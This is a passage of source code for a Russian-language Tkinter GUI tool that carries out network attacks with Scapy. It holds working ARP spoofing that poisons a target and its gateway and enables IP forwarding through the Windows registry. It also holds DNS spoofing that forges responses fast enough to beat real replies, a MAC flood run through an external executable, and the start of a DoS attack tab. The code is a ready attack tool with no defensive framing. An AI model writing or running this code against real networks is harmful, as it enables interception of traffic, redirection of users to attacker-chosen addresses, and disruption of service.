        self.arp_spoof_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                           command=self.stop_arp_spoof, width=15, state='disabled')
        self.arp_spoof_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.arp_spoof_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.arp_spoof_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.arp_spoof_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог ARP Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.arp_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.arp_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.arp_spoof_log), width=14).pack()
        self.arp_spoof_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'last_update': 0,
            'last_sent': 0
        }

    def start_arp_spoof(self):
        self.arp_spoof_running = True
        self.arp_spoof_start_btn.config(state='disabled')
        self.arp_spoof_stop_btn.config(state='normal')
        try:
            interval = float(self.arp_spoof_interval.get())
        except:
            interval = 2.0
        self.arp_spoof_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        self.enable_ip_forward(True)
        self.arp_spoof_log.insert('end', "IP forwarding включён\n")
        self.arp_spoof_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(self.arp_target_ip.get(), self.arp_gateway_ip.get(), 
                  self.arp_spoof_interface.get(), interval)
        )
        self.arp_spoof_thread.daemon = True
        self.arp_spoof_thread.start()
        self.update_arp_spoof_stats()
        self.arp_spoof_log.insert('end', f"ARP Spoofing started (interval: {interval}s)\n")
        self.status_var.set("ARP Spoofing запущен")

    def stop_arp_spoof(self):
        self.arp_spoof_running = False
        self.arp_spoof_start_btn.config(state='normal')
        self.arp_spoof_stop_btn.config(state='disabled')
        if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
            self.arp_spoof_thread.join(timeout=1.0)
        self.enable_ip_forward(False)
        self.arp_spoof_log.insert('end', "IP forwarding отключён\n")
        if self.restore_arp_var.get():
            self.restore_arp()
        total_time = time.time() - self.arp_spoof_stats['start_time']
        total_packets = self.arp_spoof_stats['sent_packets']
        total_bytes = total_packets * 42                          
        self.arp_spoof_log.insert('end', "\n--- Results ---\n")
        self.arp_spoof_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.arp_spoof_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.arp_spoof_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.arp_spoof_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")
        self.status_var.set("ARP Spoofing остановлен")

    def enable_ip_forward(self, enable):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                 r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                                 0, winreg.KEY_SET_VALUE)
            val = 1 if enable else 0
            winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, val)
            winreg.CloseKey(key)
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface",
                            self.arp_spoof_interface.get(), "forwarding=" + ("enabled" if enable else "disabled")],
                           capture_output=True)
            self.arp_spoof_log.insert('end', f"IP forwarding {'включён' if enable else 'отключён'}\n")
        except Exception as e:
            self.arp_spoof_log.insert('end', f"Не удалось изменить IP forwarding: {e}\n")

    def restore_arp(self):
        try:
            target_ip = self.arp_target_ip.get()
            gateway_ip = self.arp_gateway_ip.get()
            iface = self.arp_spoof_interface.get()
            target_mac = self.get_mac_by_ip(target_ip, iface)
            gateway_mac = self.get_mac_by_ip(gateway_ip, iface)
            attacker_mac = get_if_hwaddr(iface)
            if target_mac:
                pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
                sendp(pkt, iface=iface, verbose=0)
                self.arp_spoof_log.insert('end', f"Восстановлен ARP для цели: {target_ip} -> {gateway_mac}\n")
            if gateway_mac:
                pkt = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac)
                sendp(pkt, iface=iface, verbose=0)
                self.arp_spoof_log.insert('end', f"Восстановлен ARP для шлюза: {gateway_ip} -> {target_mac}\n")
        except Exception as e:
            self.arp_spoof_log.insert('end', f"Ошибка восстановления ARP: {e}\n")

    def get_mac_by_ip(self, ip, iface):
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=iface)
            for _, rcv in ans:
                return rcv.hwsrc
        except:
            pass
        return None

    def update_arp_spoof_stats(self):
        if not self.arp_spoof_running:
            return
        current_time = time.time()
        duration = current_time - self.arp_spoof_stats['start_time']
        time_diff = current_time - self.arp_spoof_stats['last_update']
        if time_diff >= 1:
            packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            self.arp_spoof_rate.config(text=f"{int(current_rate)}")
            self.arp_spoof_stats['last_update'] = current_time
            self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
        self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.arp_spoof_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.arp_spoof_running:
            self.root.after(1000, self.update_arp_spoof_stats)

    def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval):
        try:
            packet_count = 0
            attacker_mac = get_if_hwaddr(interface)
            while self.arp_spoof_running:
                arp_to_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                arp_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                sendp(arp_to_target, iface=interface, verbose=0)
                sendp(arp_to_gateway, iface=interface, verbose=0)
                packet_count += 2
                self.arp_spoof_stats['sent_packets'] = packet_count
                sleep_time = interval
                step = 0.1
                while sleep_time > 0 and self.arp_spoof_running:
                    time.sleep(min(step, sleep_time))
                    sleep_time -= step
        except Exception as e:
            self.arp_spoof_log.insert('end', f"ARP Spoofing error: {str(e)}\n")

    # -------------------- DNS Spoofing (new) --------------------
    def setup_dns_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        # Parameters frame
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DNS Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dns_spoof_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dns_spoof_interface.pack(side='left', padx=2)
        self.dns_spoof_interface.set(self.active_interface)
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="TTL (сек):", width=12).pack(side='left', padx=2)
        self.dns_spoof_ttl_entry = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dns_spoof_ttl_entry.pack(side='left', padx=2)
        self.dns_spoof_ttl_entry.insert(0, "5")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        self.dns_spoof_all_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row3, text="Подменять все запросы (catch-all)", variable=self.dns_spoof_all_var).pack(anchor='w', padx=5)

        # Rules table
        rules_frame = ttk.LabelFrame(left_frame, text="Правила подмены (домен → IP)")
        rules_frame.pack(fill='both', expand=True, padx=5, pady=5)
        columns = ("Домен", "IP адрес")
        self.dns_rules_tree = ttk.Treeview(rules_frame, columns=columns, show='headings', height=8)
        self.dns_rules_tree.heading("Домен", text="Домен (маска *)")
        self.dns_rules_tree.heading("IP адрес", text="Подменять на IP")
        self.dns_rules_tree.column("Домен", width=200)
        self.dns_rules_tree.column("IP адрес", width=150)
        tree_scroll = ttk.Scrollbar(rules_frame, orient="vertical", command=self.dns_rules_tree.yview)
        self.dns_rules_tree.configure(yscrollcommand=tree_scroll.set)
        self.dns_rules_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        add_frame = ttk.Frame(rules_frame)
        add_frame.pack(fill='x', pady=5)
        ttk.Label(add_frame, text="Домен:").pack(side='left', padx=2)
        self.dns_rule_domain = ttk.Entry(add_frame, width=20)
        self.dns_rule_domain.pack(side='left', padx=2)
        ttk.Label(add_frame, text="IP:").pack(side='left', padx=2)
        self.dns_rule_ip = ttk.Entry(add_frame, width=15)
        self.dns_rule_ip.pack(side='left', padx=2)
        ttk.Button(add_frame, text="Добавить", command=self.add_dns_rule, width=10).pack(side='left', padx=2)
        ttk.Button(add_frame, text="Удалить", command=self.remove_dns_rule, width=10).pack(side='left', padx=2)

        # Control buttons
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.dns_spoof_start_btn = ttk.Button(button_frame, text="Начать DNS Spoofing",
                                             command=self.start_dns_spoof, width=18)
        self.dns_spoof_start_btn.pack(side='left', padx=5)
        self.dns_spoof_stop_btn = ttk.Button(button_frame, text="Остановить",
                                            command=self.stop_dns_spoof, width=15, state='disabled')
        self.dns_spoof_stop_btn.pack(side='left', padx=5)

        # Statistics frame
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Перехвачено запросов:", width=22, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dns_intercepted_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_intercepted_label.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Отправлено подмен:", width=22, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dns_spoofed_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_spoofed_label.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (spo/s):", width=22, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dns_rate_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_rate_label.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=22, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dns_time_label = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dns_time_label.grid(row=3, column=1, padx=5, pady=2, sticky='w')

        # Log frame
        log_frame = ttk.LabelFrame(right_frame, text="Лог DNS Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.dns_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dns_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", command=lambda: self.save_log(self.dns_spoof_log), width=14).pack()

    def add_dns_rule(self):
        domain = self.dns_rule_domain.get().strip()
        ip = self.dns_rule_ip.get().strip()
        if not domain or not ip:
            messagebox.showwarning("Ошибка", "Заполните оба поля")
            return
        try:
            ipaddress.ip_address(ip)
        except:
            messagebox.showerror("Ошибка", "Неверный IP адрес")
            return
        with self.dns_spoof_lock:
            self.dns_spoof_rules[domain] = ip
        self.dns_rules_tree.insert("", "end", values=(domain, ip))
        self.dns_rule_domain.delete(0, tk.END)
        self.dns_rule_ip.delete(0, tk.END)
        self.dns_spoof_log.insert('end', f"[RULE] Добавлено: {domain} -> {ip}\n")

    def remove_dns_rule(self):
        selected = self.dns_rules_tree.selection()
        if not selected:
            messagebox.showwarning("Предупреждение", "Выберите правило для удаления")
            return
        for item in selected:
            values = self.dns_rules_tree.item(item, 'values')
            domain = values[0]
            with self.dns_spoof_lock:
                if domain in self.dns_spoof_rules:
                    del self.dns_spoof_rules[domain]
            self.dns_rules_tree.delete(item)
            self.dns_spoof_log.insert('end', f"[RULE] Удалено: {domain}\n")

    def start_dns_spoof(self):
        if self.dns_spoof_running:
            return
        # Load TTL
        try:
            ttl = int(self.dns_spoof_ttl_entry.get())
            if ttl <= 0:
                raise ValueError
            self.dns_spoof_ttl = ttl
        except:
            self.dns_spoof_ttl = 5
            self.dns_spoof_ttl_entry.delete(0, tk.END)
            self.dns_spoof_ttl_entry.insert(0, "5")
        # Add catch-all rule if enabled
        with self.dns_spoof_lock:
            if self.dns_spoof_all_var.get():
                self.dns_spoof_rules["*"] = self.dns_rule_ip.get().strip() if self.dns_rule_ip.get().strip() else "127.0.0.1"
        self.dns_spoof_running = True
        self.dns_spoof_start_btn.config(state='disabled')
        self.dns_spoof_stop_btn.config(state='normal')
        self.dns_spoof_stats = {
            'start_time': time.time(),
            'intercepted': 0,
            'spoofed': 0,
            'last_update': time.time(),
            'last_intercepted': 0,
            'last_spoofed': 0
        }
        self.dns_spoof_thread = threading.Thread(target=self.dns_spoof_worker, daemon=True)
        self.dns_spoof_thread.start()
        self.update_dns_spoof_stats()
        self.dns_spoof_log.insert('end', f"DNS Spoofing started on {self.dns_spoof_interface.get()}, TTL={self.dns_spoof_ttl}\n")
        self.dns_spoof_log.insert('end', f"Active rules: {len(self.dns_spoof_rules)}\n")
        self.status_var.set("DNS Spoofing запущен")

    def stop_dns_spoof(self):
        if not self.dns_spoof_running:
            return
        self.dns_spoof_running = False
        if self.dns_spoof_thread and self.dns_spoof_thread.is_alive():
            self.dns_spoof_thread.join(timeout=2.0)
        self.dns_spoof_start_btn.config(state='normal')
        self.dns_spoof_stop_btn.config(state='disabled')
        # Remove catch-all rule if it was auto-added
        with self.dns_spoof_lock:
            if self.dns_spoof_all_var.get() and "*" in self.dns_spoof_rules:
                del self.dns_spoof_rules["*"]
        total_time = time.time() - self.dns_spoof_stats['start_time']
        total_intercepted = self.dns_spoof_stats['intercepted']
        total_spoofed = self.dns_spoof_stats['spoofed']
        self.dns_spoof_log.insert('end', "\n--- Results ---\n")
        self.dns_spoof_log.insert('end', f"Intercepted queries: {total_intercepted}\n")
        self.dns_spoof_log.insert('end', f"Spoofed responses: {total_spoofed}\n")
        self.dns_spoof_log.insert('end', f"Duration: {total_time:.2f} sec\n")
        if total_time > 0:
            self.dns_spoof_log.insert('end', f"Avg spoof rate: {int(total_spoofed/total_time)} spo/s\n")
        self.status_var.set("DNS Spoofing остановлен")

    def dns_spoof_worker(self):
        def handle_dns_packet(packet):
            if not self.dns_spoof_running:
                return True
            # Перехватываем только DNS-запросы (qr=0)
            if DNS in packet and packet[DNS].qr == 0:
                qname = packet[DNS].qd.qname.decode('utf-8').rstrip('.')
                spoof_ip = None
                with self.dns_spoof_lock:
                    # Точное совпадение
                    if qname in self.dns_spoof_rules:
                        spoof_ip = self.dns_spoof_rules[qname]
                    else:
                        # Маски (например, *.example.com)
                        for pattern, ip in self.dns_spoof_rules.items():
                            if pattern.startswith("*.") and qname.endswith(pattern[1:]):
                                spoof_ip = ip
                                break
                            elif pattern == "*":  # catch-all
                                spoof_ip = ip
                if spoof_ip:
                    try:
                        # Создаём поддельный ответ
                        if IPv6 in packet:
                            ip_layer = IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                        else:
                            ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)

                        udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)

                        dns_response = DNS(
                            id=packet[DNS].id,
                            qr=1,
                            aa=1,
                            ra=0,
                            qd=packet[DNS].qd,
                            an=DNSRR(rrname=qname, ttl=1, rdata=spoof_ip)  # TTL = 1 секунда
                        )

                        response = ip_layer / udp_layer / dns_response

                        # Отправляем 3 копии с задержкой 1 мс, чтобы опередить реальный ответ
                        for attempt in range(3):
                            send(response, verbose=0, iface=self.dns_spoof_interface.get())
                            time.sleep(0.001)

                        with self.dns_spoof_lock:
                            self.dns_spoof_stats['spoofed'] += 1

                        self.dns_spoof_log.insert('end', f"[SPOOF] {qname} -> {spoof_ip} (3 копии, TTL=1)\n")
                        self.dns_spoof_log.see('end')

                    except Exception as e:
                        self.dns_spoof_log.insert('end', f"[ERROR] {qname}: {str(e)}\n")
                else:
                    self.dns_spoof_log.insert('end', f"[PASS] {qname}\n")
                    self.dns_spoof_log.see('end')

                with self.dns_spoof_lock:
                    self.dns_spoof_stats['intercepted'] += 1

            return False

        # Перехватываем и UDP (53), и TCP (53) – для надёжности
        try:
            sniff(
                iface=self.dns_spoof_interface.get(),
                filter="udp port 53 or tcp port 53",
                prn=handle_dns_packet,
                stop_filter=lambda x: not self.dns_spoof_running
            )
        except Exception as e:
            self.dns_spoof_log.insert('end', f"Sniffing error: {str(e)}\n")

    def update_dns_spoof_stats(self):
        if not self.dns_spoof_running:
            return
        current_time = time.time()
        time_diff = current_time - self.dns_spoof_stats['last_update']
        if time_diff >= 1:
            spoofed = self.dns_spoof_stats['spoofed']
            last_spoofed = self.dns_spoof_stats.get('last_spoofed', 0)
            rate = (spoofed - last_spoofed) / time_diff if time_diff > 0 else 0
            self.dns_rate_label.config(text=f"{int(rate)}")
            self.dns_spoof_stats['last_update'] = current_time
            self.dns_spoof_stats['last_spoofed'] = spoofed
        self.dns_intercepted_label.config(text=str(self.dns_spoof_stats['intercepted']))
        self.dns_spoofed_label.config(text=str(self.dns_spoof_stats['spoofed']))
        duration = current_time - self.dns_spoof_stats['start_time']
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dns_time_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.dns_spoof_running:
            self.root.after(1000, self.update_dns_spoof_stats)

    # -------------------- MAC flood (unchanged) --------------------
    def setup_mac_flood_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры MAC flood")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.mac_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.mac_interface.pack(side='left', padx=2)
        self.mac_interface.set(self.active_interface)
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Потоков:", width=12).pack(side='left', padx=2)
        self.mac_threads = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.mac_threads.pack(side='left', padx=2)
        self.mac_threads.insert(0, "4")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        ttk.Label(row3, text="Время (сек):", width=12).pack(side='left', padx=2)
        self.mac_duration = ttk.Entry(row3, width=10, font=('Arial', 9))
        self.mac_duration.pack(side='left', padx=2)
        self.mac_duration.insert(0, "60")
        ttk.Label(row3, text="(0=бесконечно)").pack(side='left', padx=5)
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="MAC назначения:", width=12).pack(side='left', padx=2)
        self.mac_dst = ttk.Entry(row4, width=25, font=('Arial', 9))
        self.mac_dst.pack(side='left', padx=2)
        self.mac_dst.insert(0, "ff:ff:ff:ff:ff:ff")
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        self.mac_random = tk.BooleanVar(value=False)
        ttk.Checkbutton(row5, text="Случайный MAC источника", variable=self.mac_random).pack(side='left', padx=5)
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.mac_start_btn = ttk.Button(button_frame, text="Начать MAC flood",
                                        command=self.start_mac_flood, width=18)
        self.mac_start_btn.pack(side='left', padx=5)
        self.mac_stop_btn = ttk.Button(button_frame, text="Остановить",
                                       command=self.stop_mac_flood, width=15, state='disabled')
        self.mac_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено кадров:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.mac_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (fps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.mac_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.mac_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.mac_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.mac_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог MAC flood")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.mac_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.mac_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог",
                  command=lambda: self.save_log(self.mac_log), width=14).pack()
        self.mac_stats = {'start_time': 0, 'sent_frames': 0}

    def start_mac_flood(self):
        if self.mac_attack_running:
            return
        self.mac_attack_running = True
        self.mac_start_btn.config(state='disabled')
        self.mac_stop_btn.config(state='normal')
        try:
            interface = self.mac_interface.get()
            threads = int(self.mac_threads.get())
            duration = int(self.mac_duration.get())
            dst_mac = self.mac_dst.get().strip()
            random_mac = self.mac_random.get()
        except ValueError:
            messagebox.showerror("Ошибка", "Проверьте введённые данные")
            self.mac_attack_running = False
            self.mac_start_btn.config(state='normal')
            return
        exe_path = find_exe("mac.exe")
        if not exe_path:
            self.mac_log.insert('end', "Error: mac.exe not found!\n")
            self.mac_attack_running = False
            self.mac_start_btn.config(state='normal')
            return
        args = [exe_path, interface, str(threads), str(duration)]
        if dst_mac:
            args.append(dst_mac)
        if random_mac:
            args.append("--random-mac")
        self.mac_log.delete(1.0, tk.END)
        self.mac_log.insert('end', f"MAC flood started\n")
        self.mac_log.insert('end', f"Interface: {interface}\n")
        self.mac_log.insert('end', f"Threads: {threads}\n")
        self.mac_log.insert('end', f"Duration: {duration} sec\n")
        self.mac_log.insert('end', f"Dest MAC: {dst_mac}\n")
        self.mac_log.insert('end', f"Random source MAC: {'yes' if random_mac else 'no'}\n")
        self.mac_stop_event = threading.Event()
        def mac_stats_callback(data):
            if not self.mac_attack_running:
                return
            packets = data.get('packets', 0)
            pps = data.get('pps', 0)
            elapsed = data.get('time', 0)
            self.mac_sent.config(text=str(packets))
            self.mac_rate.config(text=str(pps))
            hours = elapsed // 3600
            minutes = (elapsed % 3600) // 60
            seconds = elapsed % 60
            self.mac_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        self.mac_external_thread = threading.Thread(
            target=self.run_external_tool,
            args=(args, self.mac_log, self.mac_stop_event, 'mac'),
            kwargs={'infinite': (duration == 0), 'on_finish': self.on_mac_finished, 'stats_callback': mac_stats_callback},
            daemon=True
        )
        self.mac_external_thread.start()
        self.mac_stats = {'start_time': time.time(), 'sent_frames': 0}
        self.status_var.set("MAC flood started")

    def stop_mac_flood(self):
        if not self.mac_attack_running:
            return
        proc_info = self.external_processes.get('mac')
        if proc_info:
            proc, stop_event = proc_info
            stop_event.set()
            if proc.poll() is None:
                try:
                    proc.stdin.write('\n')
                    proc.stdin.flush()
                except:
                    pass
                try:
                    proc.wait(timeout=1)
                except subprocess.TimeoutExpired:
                    proc.kill()
        self.mac_attack_running = False
        self.mac_start_btn.config(state='normal')
        self.mac_stop_btn.config(state='disabled')
        self.status_var.set("MAC flood stopped")

    def on_mac_finished(self):
        self.mac_attack_running = False
        self.mac_start_btn.config(state='normal')
        self.mac_stop_btn.config(state='disabled')

    # -------------------- DoS attack tab (unchanged) --------------------
    def setup_custom_attack_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры DoS атаки")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="IP адрес:", width=12).pack(side='left', padx=2)
        self.custom_ip = ttk.Entry(row1, width=25, font=('Arial', 9))
        self.custom_ip.pack(side='left', padx=2)
        self.custom_ip.insert(0, "192.168.1.1")
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="Протокол:", width=12).pack(side='left', padx=2)
        self.custom_protocol = ttk.Combobox(row2, values=[
            "ICMP", "TCP", "UDP", "ARP", "DNS"
        ], width=15, font=('Arial', 9))
        self.custom_protocol.pack(side='left', padx=2)
        self.custom_protocol.set("TCP")
        self.custom_protocol.bind('<<ComboboxSelected>>', self.on_protocol_change)
        self.custom_port_frame = ttk.Frame(params_frame)
        self.custom_port_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_port_frame, text="Порт:", width=12).pack(side='left', padx=2)
        self.custom_port = ttk.Entry(self.custom_port_frame, width=10, font=('Arial', 9))
        self.custom_port.pack(side='left', padx=2)
        self.custom_port.insert(0, "80")
        row4 = ttk.Frame(params_frame)
        row4.pack(fill='x', padx=5, pady=5)
        ttk.Label(row4, text="Размер пакета:", width=12).pack(side='left', padx=2)
        self.custom_packet_size = ttk.Entry(row4, width=10, font=('Arial', 9))
        self.custom_packet_size.pack(side='left', padx=2)
        self.custom_packet_size.insert(0, "1024")
        ttk.Label(row4, text="байт").pack(side='left', padx=2)
        row5 = ttk.Frame(params_frame)
        row5.pack(fill='x', padx=5, pady=5)
        ttk.Label(row5, text="Время (сек):", width=12).pack(side='left', padx=2)
        self.custom_packet_count = ttk.Entry(row5, width=10, font=('Arial', 9))
        self.custom_packet_count.pack(side='left', padx=2)
        self.custom_packet_count.insert(0, "60")
        ttk.Label(row5, text="0 = бесконечно").pack(side='left', padx=6)
        self.custom_options_frame = ttk.Frame(params_frame)
        self.custom_random_ip = tk.BooleanVar(value=False)
        self.custom_random_mac = tk.BooleanVar(value=False)
        ttk.Checkbutton(self.custom_options_frame, text="Случайный IP", variable=self.custom_random_ip).pack(side='left', padx=5)
        ttk.Checkbutton(self.custom_options_frame, text="Случайный MAC", variable=self.custom_random_mac).pack(side='left', padx=5)
        self.custom_options_frame.pack(fill='x', padx=5, pady=5)
        self.custom_options_frame.pack_forget()                    
        self.custom_row7 = ttk.Frame(params_frame)
        self.custom_row7.pack(fill='x', padx=5, pady=5)
        ttk.Label(self.custom_row7, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.custom_interface = ttk.Combobox(self.custom_row7, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.custom_interface.pack(side='left', padx=2)
        self.custom_interface.set(self.active_interface)
        button_frame = ttk.Frame(params_frame)
